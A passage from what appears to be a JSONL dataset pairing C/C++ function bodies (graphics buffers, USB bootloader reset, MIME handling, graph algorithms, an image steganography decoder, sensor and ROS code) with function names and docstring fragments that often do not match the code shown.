\/\/find and remove it\\n    for (int i = 0; i < voodoo.num_tmu; i++)\\n    {\\n      for (int j = 0; j < rdp.texbufs[i].count; j++)\\n      {\\n        if (&(rdp.texbufs[i].images[j]) == rdp.tbuff_tex)\\n        {\\n          rdp.texbufs[i].count--;\\n          if (j < rdp.texbufs[i].count)\\n            memcpy(&(rdp.texbufs[i].images[j]), &(rdp.texbufs[i].images[j+1]), sizeof(TBUFF_COLOR_IMAGE)*(rdp.texbufs[i].count-j));\\n          return;\\n        }\\n      }\\n    }\\n  }\\n}'}","id":2644}
{"content":"{'function_name': 'usb_multi_serial_ifaceSetupHook0', 'docstring': '\/\/ for the in-band magic reset byte sequence.', 'code': 'void usb_multi_serial_rxHook0(unsigned hook, void *ignored) {\\n    (void)hook;\\n    (void)ignored;\\n    const uint8 port = 0;\\n    \/* FIXME this is mad buggy; we need a new reset sequence. E.g. NAK\\n     * after each RX means you can\\'t reset if any bytes are waiting. *\/\\n    if (reset_state == DTR_NEGEDGE) {\\n        reset_state = DTR_LOW;\\n\\n        if (multi_serial_data_available(port) >= 4) {\\n            \/\/ The magic reset sequence is \"1EAF\".\\n            static const uint8 magic[4] = {\\'1\\', \\'E\\', \\'A\\', \\'F\\'};\\t\\n\\n            uint8 chkBuf[4];\\n\\n            \/\/ Peek at the waiting bytes, looking for reset sequence,\\n            \/\/ bailing on mismatch.\\n            multi_serial_peek_ex(port, chkBuf, multi_serial_data_available(port) - 4, 4);\\n            for (unsigned i = 0; i < sizeof(magic); i++) {\\n                if (chkBuf[i] != magic[i]) {\\n                    return;\\n                }\\n            }\\n\\n            \/\/ Got the magic sequence -> reset, presumably into the bootloader.\\n            \/\/ Return address is wait_reset, but we must set the thumb bit.\\n            uintptr_t target = (uintptr_t)wait_reset | 0x1;\\n            asm volatile(\"mov r0, %[stack_top]      \\\\n\\\\t\" \/\/ Reset stack\\n                         \"mov sp, r0                \\\\n\\\\t\"\\n                         \"mov r0, #1                \\\\n\\\\t\"\\n                         \"mov r1, %[target_addr]    \\\\n\\\\t\"\\n                         \"mov r2, %[cpsr]           \\\\n\\\\t\"\\n                         \"push {r2}                 \\\\n\\\\t\" \/\/ Fake xPSR\\n                         \"push {r1}                 \\\\n\\\\t\" \/\/ PC target addr\\n                         \"push {r0}                 \\\\n\\\\t\" \/\/ Fake LR\\n                         \"push {r0}                 \\\\n\\\\t\" \/\/ Fake R12\\n                         \"push {r0}                 \\\\n\\\\t\" \/\/ Fake R3\\n                         \"push {r0}                 \\\\n\\\\t\" \/\/ Fake R2\\n                         \"push {r0}                 \\\\n\\\\t\" \/\/ Fake R1\\n                         \"push {r0}                 \\\\n\\\\t\" \/\/ Fake R0\\n                         \"mov lr, %[exc_return]     \\\\n\\\\t\"\\n                         \"bx lr\"\\n                         :\\n                         : [stack_top] \"r\" (STACK_TOP),\\n                           [target_addr] \"r\" (target),\\n                           [exc_return] \"r\" (EXC_RETURN),\\n                           [cpsr] \"r\" (DEFAULT_CPSR)\\n                         : \"r0\", \"r1\", \"r2\");\\n\\n            \/* Can\\'t happen. *\/\\n            ASSERT_FAULT(0);\\n        }\\n    }\\n}'}","id":2648}
{"content":"{'function_name': 'MimeOleGetRelatedSection', 'docstring': '\/\/ If Root is empty\\r', 'code': 'MIMEOLEAPI MimeOleGetMixedSection(\\r\\n                                  IMimeMessageTree   *pTree,\\r\\n                                  boolean             fCreate,\\r\\n                                  LPHBODY             phMixed,\\r\\n                                  boolean            *pfMultiple)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n    HBODY       hTemp;\\r\\n    HBODY       hRoot;\\r\\n    FINDBODY    rFind;\\r\\n    PROPVARIANT rVariant;\\r\\n\\r\\n    \/\/ Invalid Args\\r\\n    if (NULL == pTree || NULL == phMixed)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Init\\r\\n    ZeroMemory(&rFind, sizeof(FINDBODY));\\r\\n\\r\\n    \/\/ Find first multipart\/mixed section\\r\\n    rFind.pszPriType = (LPSTR)STR_CNT_MULTIPART;\\r\\n    rFind.pszSubType = (LPSTR)STR_SUB_MIXED;\\r\\n\\r\\n    \/\/ Find First\\r\\n    if (SUCCEEDED(pTree->FindFirst(&rFind, phMixed)))\\r\\n    {\\r\\n        \/\/ Is there another multipart\/mixed section\\r\\n        if (pfMultiple && SUCCEEDED(pTree->FindNext(&rFind, &hTemp)))\\r\\n            *pfMultiple = TRUE;\\r\\n\\r\\n        \/\/ Done\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Init\\r\\n    if (pfMultiple)\\r\\n        *pfMultiple = FALSE;\\r\\n\\r\\n    \/\/ If no Create, fail\\r\\n    if (FALSE == fCreate)\\r\\n    {\\r\\n        hr = TrapError(MIME_E_NOT_FOUND);\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Get the Root Body\\r\\n    CHECKHR(hr = pTree->GetBody(IBL_ROOT, NULL, &hRoot));\\r\\n\\r\\n    \/\/ If Root is empty\\r\\n    if (pTree->IsBodyType(hRoot, IBT_EMPTY) == S_OK)\\r\\n    {\\r\\n        \/\/ Setup Variant\\r\\n        rVariant.vt = VT_LPSTR;\\r\\n        rVariant.pszVal = (LPSTR)STR_MIME_MPART_MIXED;\\r\\n\\r\\n        \/\/ Set the Content Type\\r\\n        CHECKHR(hr = pTree->SetBodyProp(hRoot, PIDTOSTR(PID_HDR_CNTTYPE), 0, &rVariant));\\r\\n\\r\\n        \/\/ Set phRelated\\r\\n        *phMixed = hRoot;\\r\\n    }\\r\\n\\r\\n    \/\/ Otherwise, convert it to a multipart\\r\\n    else\\r\\n    {\\r\\n        \/\/ Conver this body to a multipart\/mixed\\r\\n        CHECKHR(hr = pTree->ToMultipart(HBODY_ROOT, STR_SUB_MIXED, phMixed));\\r\\n    }\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":2649}
{"content":"{'function_name': 'display2DArray', 'docstring': '\/\/ displays 2d arrays', 'code': 'bool isConsistentArray(int array[], int elements) {\\n    \/\/ Checks if all array elements are the same\\n    for (int element = 0; element < elements; element++) {\\n        if (element == 0){\\n            continue;\\n        }\\n        if (array[element - 1] != array[element]) {\\n            return false;\\n        }\\n    }\\n    return true;\\n}'}","id":2654}
{"content":"{'function_name': 'SEXYHOOK_BEGIN', 'docstring': '\/\/Child::g', 'code': 'SEXYHOOK_BEGIN(int,SEXYHOOK_CLASS,&Child::f,())\\n\\t\\t\\t{\\n\\t\\t\\t\\treturn 102;\\t\/\/Child::f\\n\\t\\t\\t}'}","id":2669}
{"content":"{'function_name': 'FSin2', 'docstring': '\/\/ Adapted from http:\/\/lab.polygonal.de\/wp-content\/articles\/fast_trig\/fastTrig.as\\r', 'code': 'static TReal Exp( TReal p_tValue, TReal p_tPrecision )\\r\\n\\t{\\r\\n\\t\\t\/\/ Taken from : A note on approximating e^x by S. Lubkin\\r\\n\\t\\t\/\/         _                    _  \\r\\n\\t\\t\/\/ e^x =  |  (6n^2 + 4nx + x^2)  |^n\\r\\n\\t\\t\/\/        |  ------------------  |\\r\\n\\t\\t\/\/\\t\\t  |_    2n * (3n - x)   _|\\r\\n\\t\\t\/\/\\r\\n\\r\\n\\t\\tTReal tResult = ( 6 * p_tPrecision * p_tPrecision + 4 * p_tPrecision * p_tValue + p_tValue * p_tValue ) \/ \\r\\n\\t\\t\\t\\t\\t    ( 2 * p_tPrecision * ( 3 * p_tPrecision - p_tValue ) );\\r\\n\\r\\n\\t\\treturn pow( tResult, p_tPrecision );\\r\\n\\t}'}","id":2670}
{"content":"{'function_name': 'CLOCK_DeinitExternalClk', 'docstring': '\/* Power down *\/', 'code': 'bool CLOCK_EnableUsbhs0PhyPllClock(clock_usb_phy_src_t src, uint32_t freq)\\n{\\n    const clock_usb_pll_config_t g_ccmConfigUsbPll = {.loopDivider = 0U, .src = 0};\\n    if (CCM_ANALOG->PLL_USB1 & CCM_ANALOG_PLL_USB1_ENABLE_MASK)\\n    {\\n        CCM_ANALOG->PLL_USB1 |= CCM_ANALOG_PLL_USB1_EN_USB_CLKS_MASK;\\n    }\\n    else\\n    {\\n        CLOCK_InitUsb1Pll(&g_ccmConfigUsbPll);\\n    }\\n    USBPHY1->CTRL &= ~USBPHY_CTRL_SFTRST_MASK; \/* release PHY from reset *\/\\n    USBPHY1->CTRL &= ~USBPHY_CTRL_CLKGATE_MASK;\\n\\n    USBPHY1->PWD = 0;\\n    USBPHY1->CTRL |= USBPHY_CTRL_ENAUTOCLR_PHY_PWD_MASK | USBPHY_CTRL_ENAUTOCLR_CLKGATE_MASK |\\n                     USBPHY_CTRL_ENUTMILEVEL2_MASK | USBPHY_CTRL_ENUTMILEVEL3_MASK;\\n\\n    freq = (uint32_t)src;\\n    freq++;\\n\\n    return true;\\n}'}","id":2671}
{"content":"{'function_name': 'inp', 'docstring': '\/\/fast input function', 'code': 'int main(){\\n\\n\\tscanf(\"%d\", &n);\\n\\tmemset(tree, 0, sizeof tree);\\n\\n\\tint a[200010];\\n\\tpci p[200010];\\n\\tstd::map<int, int> m;\\n\\n\\tint cnt = 0;\\n\\n\\tfor(int i = 0; i < n; i++){\\n\\t\\tchar c; int t;\\n\\t\\tchar op[32];\\n\\t\\tscanf(\" %c %d\", &c, &t);\\n\\t\\t\/\/ if(!strcmp(op, \"I\")) c = \\'I\\';\\n\\t\\t\/\/ if(!strcmp(op, \"D\")) c = \\'D\\';\\n\\t\\t\/\/ if(!strcmp(op, \"K\")) c = \\'K\\';\\n\\t\\t\/\/ if(!strcmp(op, \"C\")) c = \\'C\\';\\n\\n\\t\\tp[i] = pci(c,t);\\n\\t\\tif(c != \\'k\\'){\\n\\t\\t\\ta[cnt] = t;\\n\\t\\t\\tcnt++;\\n\\t\\t}\\n\\t\\tm[t]=1;\\n\\t}\\n\\n\\t\/\/ int cnt=1;\\n\\t\/\/ for(map<int,int>::iterator it=m.begin();it!=m.end();it++)\\n\\t\/\/ \\tit->second=cnt++;\\n\\n\\n\\tsort(a, a+cnt);\\n\\tint cnt1 = 1;\\n\\tfor(int i = 0; i < cnt; i++){\\n\\t\\tm[a[i]] = i+1;\\n\\t}\\n\\n\\tm[3]=3;\\n\\n\\tfor(int i = 0; i < n; i++){\\n\\t\\tpci op = p[i];\\n\\t\\tif(op.first == \\'C\\') printf(\"%d\\\\n\", query(m[op.second]-1));\\n\\t\\tif(op.first == \\'I\\') {\\n\\t\\t\\tif(query(m[op.second]) == query(m[op.second]-1)){\\n\\t\\t\\t\\tupdate(m[op.second], 1);\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\tif(op.first == \\'D\\'){\\n\\t\\t\\tif(query(m[op.second]) != query(m[op.second]-1)){\\n\\t\\t\\t\\tupdate(m[op.second], -1);\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\tif(op.first == \\'K\\'){\\n\\t\\t\\tint t = search(op.second, 1, cnt);\\n\\t\\t\\tif(t == -1) printf(\"invalid\\\\n\");\\n\\t\\t\\telse printf(\"%d\\\\n\", a[t-1]);\\n\\t\\t}\\n\\n\\t}\\n\\n\\n\\n\\treturn 0;\\t\\n}'}","id":2680}
{"content":"{'function_name': 'Mat2Base64', 'docstring': '\/\/Mat to base64', 'code': 'static std::string decode(std::string steg_base64) {\\n  cv::Mat image = Base2Mat(steg_base64);\\n\\t\/\/ std::cout << \"\\\\nRead following image\\\\n\" << steg_base64 << std::endl;\\n\\t\/\/ Stores original image\\n\\t\/\/ cv::Mat image = cv::imread(\"output.png\");\\n\\t\/\/ if(image.empty()) {\\n\\t\/\/ \\tstd::cout << \"Image Error\\\\n\";\\n\\t\/\/ \\texit(-1);\\n\\t\/\/ }\\n\\n\\t\/\/ char to work on\\n\\tchar ch=0;\\n\\t\/\/ contains information about which bit of char to work on\\n\\tint bit_count = 0;\\n\\tstd::string decoded = \"\";\\n\\n\\t\/*\\n\\tTo extract the message from the image, we will iterate through the pixels and extract the LSB of\\n\\tthe pixel values (RGB) and this way we can get our message.\\n\\t*\/\\n\\tfor(int row=0; row < image.rows; row++) {\\n\\t\\tfor(int col=0; col < image.cols; col++) {\\n\\t\\t\\tfor(int color=0; color < 3; color++) {\\n\\n\\t\\t\\t\\t\/\/ stores the pixel details\\n\\t\\t\\t\\tcv::Vec3b pixel = image.at<cv::Vec3b>(cv::Point(row,col));\\n\\n\\t\\t\\t\\t\/\/ manipulate char bits according to the LSB of pixel values\\n\\t\\t\\t\\tif(isBitSet(pixel.val[color],0))\\n\\t\\t\\t\\t\\tch |= 1;\\n\\n\\t\\t\\t\\t\/\/ increment bit_count to work on next bit\\n\\t\\t\\t\\tbit_count++;\\n\\n\\t\\t\\t\\t\/\/ bit_count is 8, that means we got our char from the encoded image\\n\\t\\t\\t\\tif(bit_count == 8) {\\n\\t\\t\\t\\t\\t\/\/ std::cout << \"hey\" << std::endl;\\n\\n\\t\\t\\t\\t\\t\/\/ NULL char is encountered\\n\\t\\t\\t\\t\\tif(ch == \\'\\\\0\\'){\\n\\t\\t\\t\\t\\t\\t\/\/ std::cout << \"Reached end of file in decoding\\\\t\";\\n\\t\\t\\t\\t\\t\\tgoto OUT;\\n\\t\\t\\t\\t\\t}\\n\\n\\t\\t\\t\\t\\tbit_count = 0;\\n\\t\\t\\t\\t\\t\/\/std::cout << ch;\\n\\t\\t\\t\\t\\tdecoded += ch;\\n\\t\\t\\t\\t\\tch = 0;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\telse {\\n\\t\\t\\t\\t\\tch = ch << 1;\\n\\t\\t\\t\\t}\\n\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\tOUT:;\\n\\n\\t\\t\/\/ std::cout << \"this rt:\\\\t\" << decoded.size() << std::endl;\\n    return decoded;\\n}'}","id":2686}
{"content":"{'function_name': 'changeBlobRange', 'docstring': \"\/\/ if range is active, and isn't surpassed by a newer range already, insert an active range\", 'code': 'bool resumeBlobRange(Reference<BlobWorkerData> bwData, KeyRange keyRange, int64_t epoch, int64_t seqno) {\\n\\tauto existingRange = bwData->granuleMetadata.rangeContaining(keyRange.begin);\\n\\t\/\/ if range boundaries don\\'t match, or this (epoch, seqno) is old or the granule is inactive, ignore\\n\\tif (keyRange.begin != existingRange.begin() || keyRange.end != existingRange.end() ||\\n\\t    existingRange.value().lastEpoch > epoch ||\\n\\t    (existingRange.value().lastEpoch == epoch && existingRange.value().lastSeqno > seqno) ||\\n\\t    !existingRange.value().activeMetadata.isValid()) {\\n\\n\\t\\tif (BW_DEBUG) {\\n\\t\\t\\tfmt::print(\"BW {0} got out of date resume range for [{1} - {2}) @ ({3}, {4}). Currently  [{5} \"\\n\\t\\t\\t           \"- {6}) @ ({7}, \"\\n\\t\\t\\t           \"{8}): {9}\\\\n\",\\n\\t\\t\\t           bwData->id.toString(),\\n\\t\\t\\t           existingRange.begin().printable(),\\n\\t\\t\\t           existingRange.end().printable(),\\n\\t\\t\\t           existingRange.value().lastEpoch,\\n\\t\\t\\t           existingRange.value().lastSeqno,\\n\\t\\t\\t           keyRange.begin.printable(),\\n\\t\\t\\t           keyRange.end.printable(),\\n\\t\\t\\t           epoch,\\n\\t\\t\\t           seqno,\\n\\t\\t\\t           existingRange.value().activeMetadata.isValid() ? \"T\" : \"F\");\\n\\t\\t}\\n\\n\\t\\treturn false;\\n\\t}\\n\\tif (existingRange.value().lastEpoch != epoch || existingRange.value().lastSeqno != seqno) {\\n\\t\\t\/\/ update the granule metadata map, and the continueEpoch\/seqno.  Saves an extra transaction\\n\\t\\texistingRange.value().lastEpoch = epoch;\\n\\t\\texistingRange.value().lastSeqno = seqno;\\n\\t\\texistingRange.value().activeMetadata->continueEpoch = epoch;\\n\\t\\texistingRange.value().activeMetadata->continueSeqno = seqno;\\n\\t\\texistingRange.value().activeMetadata->resume();\\n\\t}\\n\\t\/\/ else we already processed this continue, do nothing\\n\\treturn true;\\n}'}","id":2692}
{"content":"{'function_name': 'deal_orm_load_actor', 'docstring': '\/\/ \u4e0d\u517c\u5bb9\u7684\u6570\u636e\u88ab\u5047\u5b9a\u653e\u5728\u5c3e\u7aef\uff0c\u4e14\u53ea\u5b58\u5728\u5185\u5b58\u7ed3\u6784\u5927\u4e8edb\u7ed3\u6784\u7684\u60c5\u51b5', 'code': 'void deal_orm_new_actor(orm_msg * msg, orm_msg ** result_msg)\\n{\\n\\tapr_status_t rv = 0;\\n    cache_session * session = (cache_session *)msg->data;\\n    cache_session_cb_data & cbdata = session->data;\\n    new_actor_ctx * ctx = (new_actor_ctx *)cbdata.input;\\n    scope_pool s(_orm_pool);\\n\\torm_msg * ack_msg = NULL;\\n\\n\\t\/\/ \u68c0\u67e5\u662f\u5426\u5df2\u7ecf\u5b58\u5728\u6b64uin\u7684\u89d2\u8272\u8bb0\u5f55\\n\\tdeal_orm_load_actor(msg, result_msg, s.subp);\\n\\n\\tack_msg = *result_msg;\\n\\tif (ack_msg->result != EC_ACTORNOTFOUND) {\\n\\t\\treturn ;\\n\\t}\\n\\n\\tfree(ack_msg);\\n\\tack_msg = NULL;\\n\\n\\tack_msg = (orm_msg *)malloc(sizeof(orm_msg));\\n\\tack_msg->sid = msg->sid;\\n\\tack_msg->uin = msg->uin;\\n\\tack_msg->result = EC_SUCCESS;\\n\\tack_msg->msg_id = msg->msg_id;\\n\\tack_msg->data = NULL;\\n\\tack_msg->data_len = 0;\\n\\n\\tactor * obj = (actor *)malloc(sizeof(actor));\\n\\tobj->uin = msg->uin;\\n\\tstrcpy_s(obj->name, sizeof(obj->name), ctx->name);\\n\\tobj->exp = 0;\\n\\tobj->gold = 8000000;\\n\\tobj->stone = 20000;\\n\\tobj->stamina = 120;\\n\\n\\tcard_blob_t & cards = obj->cards;\\n    cards.blob_size = sizeof(card_blob_t);\\n    cards.card_size = sizeof(card_t);\\n\\tcards.card_count = 0;\\n\\tfor (int i = 0; i < ACTOR_CARDS_MAXCOUNT; ++ i) {\\n\\t\\tcard_t & card = cards.array_[i];\\n\\t\\tmemset(&card, 0, sizeof(card));\\n\\t}\\n\\n\\tint nrows = 0;\\n    char * sql = \"INSERT INTO mt_actor \"\\n        \" (uin, name, exp, stamina, stone, gold, cards) \"\\n        \" VALUES (%d, %s, %d, %d, %d, %d, %pDb) \";\\n\\n\\tapr_dbd_prepared_t * stmt = NULL;\\n\\trv = apr_dbd_prepare(_driver, s.subp, _handle, sql, NULL, &stmt);\\n\\tif (rv != APR_SUCCESS) {\\n\\t\\tfprintf(stderr, \"Failed to prepare SQL statement: %s\\\\n\",\\n\\t\\t\\tapr_dbd_error(_driver, _handle, rv));\\n\\t\\tgoto INSERT_FAULT;\\n\\t}\\n\\n    const void * args[10] = {\\n        &obj->uin,\\n        obj->name,\\n        &obj->exp,\\n        &obj->stamina,\\n        &obj->stone,\\n        &obj->gold,\\n        &cards,\\n        &cards.blob_size,\\n        NULL,\\n        NULL};\\n\\trv = apr_dbd_pbquery(_driver, s.subp, _handle, &nrows, stmt, args);\\n\\tif (rv != APR_SUCCESS) {\\n\\t\\tfprintf(stderr, \"Failed to pbquery SQL statement: %s\\\\n\",\\n\\t\\t\\tapr_dbd_error(_driver, _handle, rv));\\n\\t\\tgoto INSERT_FAULT;\\n\\t}\\n\\n\\tack_msg->data = obj;\\n\\tack_msg->data_len = sizeof(actor);\\n\\t*result_msg = ack_msg;\\n\\treturn ;\\n\\nINSERT_FAULT:\\n\\tack_msg->result = EC_SERVERBUSY;\\n\\t*result_msg = ack_msg;\\n\\tfree(obj);\\n}'}","id":2702}
{"content":"{'function_name': 'GetShortestDistances', 'docstring': '\/\/ current depth', 'code': 'int GetShortestDistancesMP2(const PGraph& Graph, const int& StartNId, const bool& FollowOut, const bool& FollowIn, TIntV& ShortestDists) {\\n  int MxNId = Graph->GetMxNId();\\n  int NonNodeDepth = 2147483647; \/\/ INT_MAX\\n  int InfDepth = 2147483646; \/\/ INT_MAX - 1\\n  ShortestDists.Gen(MxNId);\\n  #pragma omp parallel for schedule(dynamic,10000)\\n  for (int NId = 0; NId < MxNId; NId++) {\\n    if (Graph->IsNode(NId)) { ShortestDists[NId] = InfDepth; }\\n    else { ShortestDists[NId] = NonNodeDepth; }\\n  }\\n\\n  TIntV Vec1(MxNId, 0); \/\/ ensure enough capacity\\n  TIntV Vec2(MxNId, 0); \/\/ ensure enough capacity\\n\\n  ShortestDists[StartNId] = 0;\\n  TIntV* PCurV = &Vec1;\\n  PCurV->Add(StartNId);\\n  TIntV* PNextV = &Vec2;\\n  int Depth = 0; \/\/ current depth\\n\\n  while (!PCurV->Empty()) {\\n    Depth++; \/\/ increase depth\\n    #pragma omp parallel for schedule(dynamic,10000)\\n    for (int i = 0; i < PCurV->Len(); i++) {\\n      int NId = PCurV->GetVal(i);\\n      typename PGraph::TObj::TNodeI NI = Graph->GetNI(NId);\\n      for (int e = 0; e < NI.GetOutDeg(); e++) {\\n        const int OutNId = NI.GetOutNId(e);\\n        if (__sync_bool_compare_and_swap(&(ShortestDists[OutNId].Val), InfDepth, Depth)) {\\n          PNextV->AddMP(OutNId);\\n        }\\n      }\\n    }\\n\/\/      #pragma omp parallel for schedule(dynamic,10000)\\n\/\/      for (int NId = 0; NId < MxNId; NId++) {\\n\/\/        if (ShortestDists[NId] == InfDepth) {\\n\/\/          typename PGraph::TObj::TNodeI NI = Graph->GetNI(NId);\\n\/\/          for (int e = 0; e < NI.GetInDeg(); e++) {\\n\/\/            const int InNId = NI.GetInNId(e);\\n\/\/            if (ShortestDists[InNId] < Depth) {\\n\/\/              ShortestDists[NId] = Depth;\\n\/\/              PNextV->AddMP(NId);\\n\/\/              break;\\n\/\/            }\\n\/\/          }\\n\/\/        }\\n\/\/      }\\n    \/\/ swap pointer, no copying\\n    TIntV* Tmp = PCurV;\\n    PCurV = PNextV;\\n    PNextV = Tmp;\\n    \/\/ clear next\\n    PNextV->Reduce(0); \/\/ reduce length, does not initialize new array\\n  }\\n  return Depth-1;\\r\\n}'}","id":2703}
{"content":"{'function_name': 'GetBfsEffDiam', 'docstring': '\/\/ average shortest path length\\r', 'code': 'double GetBfsEffDiam(const PGraph& Graph, const int& NTestNodes, const TIntV& SubGraphNIdV, const bool& IsDir, double& EffDiam, int& FullDiam) {\\r\\n  EffDiam = -1;\\r\\n  FullDiam = -1;\\r\\n\\r\\n  TIntFltH DistToCntH;\\r\\n  TBreathFS<PGraph> BFS(Graph);\\r\\n  \/\/ shotest paths\\r\\n  TIntV NodeIdV(SubGraphNIdV);  NodeIdV.Shuffle(TInt::Rnd);\\r\\n  TInt Dist;\\r\\n  for (int tries = 0; tries < TMath::Mn(NTestNodes, SubGraphNIdV.Len()); tries++) {\\r\\n    const int NId = NodeIdV[tries];\\r\\n    BFS.DoBfs(NId, true, ! IsDir, -1, TInt::Mx);\\r\\n    for (int i = 0; i < SubGraphNIdV.Len(); i++) {\\r\\n      if (BFS.NIdDistH.IsKeyGetDat(SubGraphNIdV[i], Dist)) {\\r\\n        DistToCntH.AddDat(Dist) += 1;\\r\\n      }\\r\\n    }\\r\\n  }\\r\\n  TIntFltKdV DistNbrsPdfV;\\r\\n  for (int i = 0; i < DistToCntH.Len(); i++) {\\r\\n    DistNbrsPdfV.Add(TIntFltKd(DistToCntH.GetKey(i), DistToCntH[i]));\\r\\n  }\\r\\n  DistNbrsPdfV.Sort();\\r\\n  EffDiam = TSnap::TSnapDetail::CalcEffDiamPdf(DistNbrsPdfV, 0.9);  \/\/ effective diameter (90-th percentile)\\r\\n  FullDiam = DistNbrsPdfV.Last().Key;                 \/\/ approximate full diameter (max shortest path length over the sampled nodes)\\r\\n  return EffDiam;                                     \/\/ average shortest path length\\r\\n}'}","id":2705}
{"content":"{'function_name': 'loop', 'docstring': '\/\/  delay(1000);', 'code': 'void printTempHumid()\\n{\\n    \/\/ Reading temperature or humidity takes about 250 milliseconds!\\n    \/\/ Sensor readings may also be up to 2 seconds \\'old\\' (its a very slow sensor)\\n    float h = bme.getHumidity();\\n    \/\/ Read temperature as Celsius (the default)\\n    float t = bme.getTemperature();\\n  \\n    \/\/ Check if any reads failed and exit early (to try again).\\n    if (isnan(h) || isnan(t)) {\\n      Serial.println(\"Failed to read from DHT sensor!\");\\n      return;\\n    }\\n  \\n    \/\/ Compute heat index in Fahrenheit (the default)\\n\/\/    float hif = dht.computeHeatIndex(f, h);\\n    \/\/ Compute heat index in Celsius (isFahreheit = false)\\n\/\/    float hic = dht.computeHeatIndex(t, h, false);\\n\\n    display.setTextColor(WHITE);\\n    display.setCursor(0,0);\\n    display.setTextSize(2);\\n    display.print((int)t);\\n    display.setTextSize(1);\\n    display.print(\"C \");  \\n    display.setCursor(0,15);    \\n    display.setTextSize(2);\\n    display.print((int)h);\\n    display.setTextSize(1);    \\n    display.print(\"%\");  \\n    display.display();\\n  }'}","id":2718}
{"content":"{'function_name': 'MimeOleSetPropA', 'docstring': '\/\/ Call Method\\r', 'code': 'MIMEOLEAPI MimeOleGetPropW(\\r\\n                           IMimePropertySet   *pPropertySet,\\r\\n                           LPCSTR              pszName,\\r\\n                           DWORD               dwFlags,\\r\\n                           LPWSTR             *ppszData)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n\\r\\n    \/\/ Invaid Arg\\r\\n    if (NULL == pPropertySet)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Initialzie PropVariant\\r\\n    PROPVARIANT rVariant;\\r\\n    rVariant.vt = VT_LPWSTR;\\r\\n\\r\\n    \/\/ Call Method\\r\\n    CHECKHR(hr = pPropertySet->GetProp(pszName, dwFlags, &rVariant));\\r\\n\\r\\n    \/\/ Return the Data\\r\\n    *ppszData = rVariant.pwszVal;\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":2720}
{"content":"{'function_name': 'ultrasonic_callback', 'docstring': '\/\/ If range values were too close', 'code': 'int main(int argc, char** argv)\\n{\\n\\tros::init(argc, argv, \"safety_interrupt\");\\n\\tros::NodeHandle nh;\\n\\tros::NodeHandle private_nh_(\"~\");\\n\\n\\tprivate_nh_.param(\"\/safety\/ultrasonic_threshold\", ultrasonic_threshold, 2.f);\\n\\n  ros::Subscriber ready_sub = nh.subscribe(\"uav_nav\/dc_ready\", 1, &readyCb);\\n  while(ros::ok() && !ready)\\n  {\\n    ros::spinOnce();\\n  }\\n\\n  ultrasonic_reset = ros::Time::now().toSec();\\n  \/\/laser_scan_reset = ros::Time::now().toSec();\\n\\t\/\/rpy_reset = ros::Time::now().toSec();\\n\\t\/\/local_pos_reset = ros::Time::now().toSec();\\n  \/\/velocity_reset = ros::Time::now().toSec();\\n\\n\\t\/\/ Subscribers\\n\\tros::Subscriber ultrasonic_sub = nh.subscribe(\"uav_nav\/guidance\/ultrasonic\",      1, &ultrasonic_callback);\\n\\t\/\/ros::Subscriber laser_scan_sub = nh.subscribe(\"uav_nav\/laser_scan_from_depthIMG\", 1, &laser_scan_callback);\\n  \/\/ros::Subscriber rpy_sub        = nh.subscribe(\"uav_nav\/roll_pitch_yaw\",           1, &rpy_callback);\\n \\t\/\/ros::Subscriber loc_pos_sub    = nh.subscribe(\"dji_sdk\/local_position\",           1, &local_pos_callback);\\n \\t\/\/ros::Subscriber vel_sub        = nh.subscribe(\"dji_sdk\/velocity\",                 1, &velocity_callback);\\n\\n\\t\/\/ Publisher\\n\\tsignal_interrupt = nh.advertise<std_msgs::UInt8>(\"uav_nav\/signal_interrupt\", 1);\\n\\n\\tinterrupt_signal.data = 0;\\n\\n\\tros::spinOnce();\\n  ros::Duration(2).sleep();\\n  ros::spinOnce();\\n\\n\\twhile(ros::ok())\\n\\t{\\n\\t\\tif(interrupt_signal.data != 2)\\n\\t\\t{\\n  \\t\\tultrasonic_counter = ros::Time::now().toSec() - ultrasonic_reset;\\n  \\t\\t\/\/laser_scan_counter = ros::Time::now().toSec() - laser_scan_reset;\\n      \/\/rpy_counter        = ros::Time::now().toSec() - rpy_reset;\\n  \\t\\t\/\/local_pos_counter  = ros::Time::now().toSec() - local_pos_reset;\\n      \/\/velocity_counter   = ros::Time::now().toSec() - velocity_reset;\\n\\n  \\t\\tif(ultrasonic_counter > threshold_sec \/*||\\n         laser_scan_counter > threshold_sec ||\\n         rpy_counter        > threshold_sec ||\\n         local_pos_counter  > threshold_sec ||\\n         velocity_counter   > threshold_sec*\/)\\n      {\\n        interrupt_signal.data = 1;\\n        ROS_ERROR(\"Ultrasonic topic is down. Delay: %f.\", ultrasonic_counter);\\n  \\t\\t\\t\/*ROS_ERROR(\"Data logging problem, times: %f, %f, %f, %f, %f and %f\",\\n                  vel_cmd_counter,\\n                  velocity_counter,\\n                  rpy_counter,\\n                  ultrasonic_counter,\\n                  laser_scan_counter,\\n                  local_pos_counter);*\/\\n      }\\n\\t\\t\\telse\\n      {\\n        interrupt_signal.data = 0;\\n      }\\n\\n  \\t\\tsignal_interrupt.publish(interrupt_signal);\\n\\t\\t}\\n\\n\\t\\tros::spinOnce();\\n\\t}\\n\\n\\treturn 0;\\n}'}","id":2723}
